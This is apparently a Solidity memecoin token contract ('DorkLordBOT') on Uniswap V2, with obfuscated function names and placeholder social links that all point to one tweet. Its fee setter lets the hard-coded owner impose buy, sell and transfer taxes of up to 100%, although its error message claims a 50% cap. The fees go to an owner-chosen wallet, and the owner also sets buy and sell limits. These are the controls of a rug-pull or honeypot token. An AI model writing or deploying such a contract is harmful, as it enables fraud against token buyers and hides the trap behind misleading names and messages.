// SPDX-License-Identifier: No License

/* 

.........................................................................................=
.........................................................................................-
.........................................................................................-
..................................::::...................................................-
............................:=*#%@%%%%%%##+=:............................................-
..................::--====+#@%%%############%%#+==----==++=-:............................-
...............:-=++++++#%@%%%%#########*##*##**#####**#######*=:........................-
.............:=++++++*#@%%%#%%%%##%#%#########*****#********##*##*=......................-
...........:=+++++*#%@%%%%#%%%%%%%%%%%%%%%%%#####**#*******#########=....................-
.........:=+++++#%@%%%%%%%%%%%%%%%###%%#%%#%%%%#######****#***#######%+:.................-
.......:=+++++#@@%%%%%%%%%%%%################*#########%%############%%%*-...............-
.....:-+++++#@@%%%%#%%%%%####%%%%##%%#########################*##***#######+=-:..........-
...:-+++++*%@@%%%%%%%%%##%%%%%%%%%%%%@@@%%%%%%%%%%%%#########%%%%%#%############+........-
..-++++++%@%%@%%%%%%%%##%%%%@%%#####%%%%######%%%%%%%%%@%%@%%%%%%%%%%%%%%%%%%@%###-......-
.=++++++%@@%%@@%%%%%%##%%@@%#*+*+**##**##################%%@%%%%%%%###########%%##%:.....-
=++++++#@@%%%@@%%%%%%%%%@%*+##*++*####%%###%@%%%%%%%%*+*#%##%#####%%%@%#*++**##*%#%+.....-
+++++++%@%%@%%%%%%%@%%%%@#+-==+#%@##***=--+%%%%%%%%%%%:::-=%%##@%%%%%%%%=:::::-#@%%#.....-
++++=+*@@%@%%@%%%%%@%%%%@#*######%%##%#=::-%%%%%%%%%%#:::::*==*%%%%%%%%%=::::::=%%#*.....-
+====+#@@@@@@@%%%%@%%%%%%*=+*#*##****#%%%*=+#%%%%%%%*::::=**---#%%%%%%%+:::::=*@%%%+.....-
++=+++#@@@@@@@%%%%@%%%%%#*#**++=*#**+++*#####%%%#*+==+*####%%#**#%%%%#*++**##%%%##%-.....-
+====+*@@@@@@%%%%@%%%%%%#*#**+=---*##+===++*##########***+--*%#############%@%@%%%*......-
+++=++*@@@@@%%%%@@##%%#%+=--==+**+--=*##*++==++**###*=--=:...**+++++++++*##@%%%%#%-......-
+++++++@@@@%%%%@@##%%%##-=====++--+++---=+++*+++==---++=::...-#*++++****+:=%%@##%%:......-
+++++++%@@%%%%@@###%%#%-++=---::++:-=+***++===++++**+=---::....+#*++====+**%%@###%:......-
++++=++#@%%%@@@%##%%#*#-++=:=+=-:-===*+=--------=*+=:..---:::...=#===--==::*@@###%.......-
+=++++*%%%%@@@%#######=:#+=-:+#+==--:.-++++==++*#+-:.:++=------=-::....-*-.-%@%%%@.......-
++++++@%%%@@@@#%%%#*#-.+*#+=-::-=**+=---:::-+***++==+**+=====+#*=--::-+#***+#@@%%%:......-
+++++*%%%@@@@%%%%###-:++-###+=-::::=+***==---::--===++++***++==--====--::.::-@@%%%:......-
+++++%%%%@@%%%%%#%@#-++::#++**===--::::-+****+==-----::::::----==--------==+#@@%%@:......-
+++++#%%%@%%%%%%@@@@#==-++==:=%#**++=---:::::-=+*****+++++++***++++****++===*@@%%%=......-
++++++%%%%#%%%%@@@@@@%*=-=-:.:#*+==+***++=++=---::::--===-:::::::::::::-----+@@@%%#......-
++++++##%%##%##@@@@@@@@@%*+--++=-::::-*###*******++****+====++**+*++++##%%%@@@@%%%*......-
++++++*%%%#%%%#%@@@@@%%@%%%%%%*+=--=+++==-:..:+*#**=--=+*#%#*+=--=+*%@@@%%%%%@@%%%=......-
+++*%@@@@@@%%####%@@@@@@%%%%%@@@@@%#*+-=---=+*++=:...-+**++=-:::=#%@%%%%%%%%@@%%%%.......-
+#@@%%%@@@%%@@%#%###%@@@@@%%%%%%%%%%%@%*+++**##**+=-===+#######%@%%%%%%%%%%@@%#%#:.......-
@@%%%%@@@%%%%@@@##%%###%%%@@@@@@@@%%%%%%%@@%##%##%%%%%##**#@@@@%%%%%%%%%%@@%#%%#.........-
%%%%%%%%%%%%%%@@@%##%%%#****###%%%%@@@@@@@@@@%###*****###########%%%@@@@%%%%#%+..........-
%@%@@%@%%%@%%%%%%%@%*#%%%%##***#*****##%%%%@@@@@%%%%##*###***#******#######%*:...........-
%%#####%%%%%%%%%%%%@%##%%%%%%#######################%%%%####**##*#**####%##-.............-
############*##%%%%@@@@###%%%%%%%%%%%%%%%%%#%%%%%%%%##%%%%%%##########%##%%+.............-
##############***##%%@@@@%###############%%%##%@@%%%@@%%#%%%%%%%%%%%%##%%%%%*............-
##########*#****#####%@@@@%@@%%%%%%%%%%###**##@@@%###%%@@%%###%%#####%%###%%#*...........-
########**#####%%%%##%%@@%%%@@@@@%%%#########@@@@@#######%%%%%%%%%%############..........-
####*##*##%%%%%%%%%%%%%@@%%#%@%%%%%#########%@@@@@%%%%%%%%#######%%%##########%*.........-

Telegram - https://twitter.com/Matt_Furie/status/1699147199496740876?s=20
Website - https://twitter.com/Matt_Furie/status/1699147199496740876?s=20
Medium - https://twitter.com/Matt_Furie/status/1699147199496740876?s=20
Reddit - https://twitter.com/Matt_Furie/status/1699147199496740876?s=20
Telegram Bot - https://twitter.com/Matt_Furie/status/1699147199496740876?s=20

*/

pragma solidity 0.8.19;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol"; 
import "./IUniswapV2Factory.sol";
import "./IUniswapV2Pair.sol";
import "./IUniswapV2Router01.sol";
import "./IUniswapV2Router02.sol";

contract DorkLordBOT is ERC20, ERC20Burnable, Ownable {
    
    uint256 public swapThreshold;
    
    uint256 private _mainPending;

    address public InvigorateWeaponryMetricFramework;
    uint16[3] public FinancialSwiftPerspectiveAnalysis;

    mapping (address => bool) public isExcludedFromFees;

    uint16[3] public KindleWeaponryBlueprint;
    bool private _swapping;

    IUniswapV2Router02 public routerV2;
    address public ClarifyExplosionStandards;
    mapping (address => bool) public BotanicalWebOrigin;

    mapping (address => bool) public isExcludedFromLimits;

    uint256 public maxBuyAmount;
    uint256 public maxSellAmount;
 
    event SwapThresholdUpdated(uint256 swapThreshold);

    event InvigorateWeaponryMetricFrameworkUpdated(address InvigorateWeaponryMetricFramework);
    event ThoroughBusinessPulseAudit(uint16 buyFee, uint16 sellFee, uint16 transferFee);
    event BusinessEvaluationOmnibus(address recipient, uint256 amount);

    event ExcludeFromFees(address indexed account, bool isExcluded);

    event RouterV2Updated(address indexed routerV2);	
    event AllianceRebootModifications(address indexed AMMPair, bool isPair);

    event ExcludeFromLimits(address indexed account, bool isExcluded);

    event MaxBuyAmountUpdated(uint256 maxBuyAmount);
    event MaxSellAmountUpdated(uint256 maxSellAmount);
 
    constructor()
        ERC20(unicode"ᗪOᖇK ᒪOᖇᗪ BOT", unicode"ᗪOᖇK ᒪOᖇᗪ BOT") 
    {
        address supplyRecipient = 0xd340577d29a6B81310C9b77c682F2bD5Bac92c7C;
        
        ApexMarksmenFiscalVoid(120000000 * (10 ** decimals()) / 10);

        MagnifyMissileLimitationSchematics(0xd340577d29a6B81310C9b77c682F2bD5Bac92c7C);
        StrengthenPeakMomentumPurchaseThreshold(2000, 2000, 0);

        excludeFromFees(supplyRecipient, true);
        excludeFromFees(address(this), true); 

        _updateRouterV2(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

        excludeFromLimits(supplyRecipient, true);
        excludeFromLimits(address(this), true);
        excludeFromLimits(address(0), true); 
        excludeFromLimits(InvigorateWeaponryMetricFramework, true);

        AbruptBlazeFoundationExpenseAlchemy(120000000 * (10 ** decimals()) / 10);
        PartisanUnityPrinciples(120000000* (10 ** decimals()) / 10);

        _mint(supplyRecipient, 10000000000 * (10 ** decimals()) / 10);
        _transferOwnership(0xd340577d29a6B81310C9b77c682F2bD5Bac92c7C);
    }

    receive() external payable {}

    function decimals() public pure override returns (uint8) {
        return 18;
    }
    
    function _swapTokensForCoin(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = routerV2.WETH();

        _approve(address(this), address(routerV2), tokenAmount);

        routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount, 0, path, address(this), block.timestamp);
    }

    function ApexMarksmenFiscalVoid(uint256 _swapThreshold) public onlyOwner {
        swapThreshold = _swapThreshold;
        
        emit SwapThresholdUpdated(_swapThreshold);
    }

    function FinancialGenuinenessCertification() public view returns (uint256) {
        return 0 + _mainPending;
    }

    function MagnifyMissileLimitationSchematics(address _newAddress) public onlyOwner {
        InvigorateWeaponryMetricFramework = _newAddress;

        excludeFromFees(_newAddress, true);

        emit InvigorateWeaponryMetricFrameworkUpdated(_newAddress);
    }

    function StrengthenPeakMomentumPurchaseThreshold(uint16 _buyFee, uint16 _sellFee, uint16 _transferFee) public onlyOwner {
        FinancialSwiftPerspectiveAnalysis = [_buyFee, _sellFee, _transferFee];

        KindleWeaponryBlueprint[0] = 0 + FinancialSwiftPerspectiveAnalysis[0];
        KindleWeaponryBlueprint[1] = 0 + FinancialSwiftPerspectiveAnalysis[1];
        KindleWeaponryBlueprint[2] = 0 + FinancialSwiftPerspectiveAnalysis[2];
        require(KindleWeaponryBlueprint[0] <= 10000 && KindleWeaponryBlueprint[1] <= 10000 && KindleWeaponryBlueprint[2] <= 10000, "TaxesDefaultRouter: Cannot exceed max total fee of 50%");

        emit ThoroughBusinessPulseAudit(_buyFee, _sellFee, _transferFee);
    }

    function excludeFromFees(address account, bool isExcluded) public onlyOwner {
        isExcludedFromFees[account] = isExcluded;
        
        emit ExcludeFromFees(account, isExcluded);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        
        bool canSwap = FinancialGenuinenessCertification() >= swapThreshold;
        
        if (!_swapping && !BotanicalWebOrigin[from] && canSwap) {
            _swapping = true;
            
            if (false || _mainPending > 0) {
                uint256 token2Swap = 0 + _mainPending;
                bool success = false;

                _swapTokensForCoin(token2Swap);
                uint256 coinsReceived = address(this).balance;
                
                uint256 mainPortion = coinsReceived * _mainPending / token2Swap;
                if (mainPortion > 0) {
                    (success,) = payable(address(InvigorateWeaponryMetricFramework)).call{value: mainPortion}("");
                    require(success, "TaxesDefaultRouterWalletCoin: Fee transfer error");
                    emit BusinessEvaluationOmnibus(InvigorateWeaponryMetricFramework, mainPortion);
                }
                _mainPending = 0;

            }

            _swapping = false;
        }

        if (!_swapping && amount > 0 && to != address(routerV2) && !isExcludedFromFees[from] && !isExcludedFromFees[to]) {
            uint256 fees = 0;
            uint8 txType = 3;
            
            if (BotanicalWebOrigin[from]) {
                if (KindleWeaponryBlueprint[0] > 0) txType = 0;
            }
            else if (BotanicalWebOrigin[to]) {
                if (KindleWeaponryBlueprint[1] > 0) txType = 1;
            }
            else if (KindleWeaponryBlueprint[2] > 0) txType = 2;
            
            if (txType < 3) {
                
                fees = amount * KindleWeaponryBlueprint[txType] / 10000;
                amount -= fees;
                
                _mainPending += fees * FinancialSwiftPerspectiveAnalysis[txType] / KindleWeaponryBlueprint[txType];

                
            }

            if (fees > 0) {
                super._transfer(from, address(this), fees);
            }
        }
        
        super._transfer(from, to, amount);
        
    }

    function _updateRouterV2(address router) private {
        routerV2 = IUniswapV2Router02(router);
        ClarifyExplosionStandards = IUniswapV2Factory(routerV2.factory()).createPair(address(this), routerV2.WETH());
        
        excludeFromLimits(router, true);

        _setAMMPair(ClarifyExplosionStandards, true);

        emit RouterV2Updated(router);
    }

    function setAMMPair(address pair, bool isPair) public onlyOwner {
        require(pair != ClarifyExplosionStandards, "DefaultRouter: Cannot remove initial pair from list");

        _setAMMPair(pair, isPair);
    }

    function _setAMMPair(address pair, bool isPair) private {
        BotanicalWebOrigin[pair] = isPair;

        if (isPair) { 
            excludeFromLimits(pair, true);

        }

        emit AllianceRebootModifications(pair, isPair);
    }

    function excludeFromLimits(address account, bool isExcluded) public onlyOwner {
        isExcludedFromLimits[account] = isExcluded;

        emit ExcludeFromLimits(account, isExcluded);
    }

    function AbruptBlazeFoundationExpenseAlchemy(uint256 _maxBuyAmount) public onlyOwner {
        maxBuyAmount = _maxBuyAmount;
        
        emit MaxBuyAmountUpdated(_maxBuyAmount);
    }

    function PartisanUnityPrinciples(uint256 _maxSellAmount) public onlyOwner {
        maxSellAmount = _maxSellAmount;
        
        emit MaxSellAmountUpdated(_maxSellAmount);
    }

    function _beforeTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        if (BotanicalWebOrigin[from] && !isExcludedFromLimits[to]) { // BUY
            require(amount <= maxBuyAmount, "MaxTx: Cannot exceed max buy limit");
        }
    
        if (BotanicalWebOrigin[to] && !isExcludedFromLimits[from]) { // SELL
            require(amount <= maxSellAmount, "MaxTx: Cannot exceed max sell limit");
        }
    
        super._beforeTokenTransfer(from, to, amount);
    }

    function _afterTokenTransfer(address from, address to, uint256 amount)
        internal
        override
    {
        super._afterTokenTransfer(from, to, amount);
    }
}